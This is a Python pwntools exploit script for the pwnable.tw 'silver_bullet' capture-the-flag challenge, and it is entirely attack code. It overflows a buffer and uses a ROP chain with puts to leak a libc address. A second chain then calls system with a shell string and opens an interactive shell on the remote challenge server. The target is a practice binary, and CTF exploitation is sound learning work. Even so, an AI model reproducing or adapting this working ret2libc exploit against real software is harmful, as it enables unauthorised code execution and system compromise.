from pwn import *
from icecream import ic

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'i386'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10103)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x08048839
b *0x08048900
c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

def create_bullet(payload):
    sla(b"hoice :", b'1')
    sla(b" of bullet :", payload)

def power_up(payload):
    sa(b"oice :", b'2')
    sa(b"on of bullet :", payload)

def fight():
    sla(b"hoice :", b'3')

def quit():
    sla(b"hoice :", b'4')

payload = b'a'*45
create_bullet(payload)

power_up(b'\xff\xff\xff')
# power_up(b'\xff')
payload = b'\xff\xff\xff\xff\xff\xff\xff'
payload += p32(exe.plt['puts'])
payload += p32(exe.sym['main'])
payload += p32(exe.got['puts'])
power_up(payload)
fight()
ru(" win !!\n")
leak = u32(re(4))
oneshot = leak + 778662
payload = b'a'*45
create_bullet(payload)
libc.address = leak - 389440
power_up(b'\xff\xff\xff')
# power_up(b'\xff')
payload = b'\xff\xff\xff\xff\xff\xff\xff'
payload += p32(libc.sym['system'])
payload += p32(libc.sym['exit'])
payload += p32(libc.address + 0x158e8b)
power_up(payload)
fight()
i()
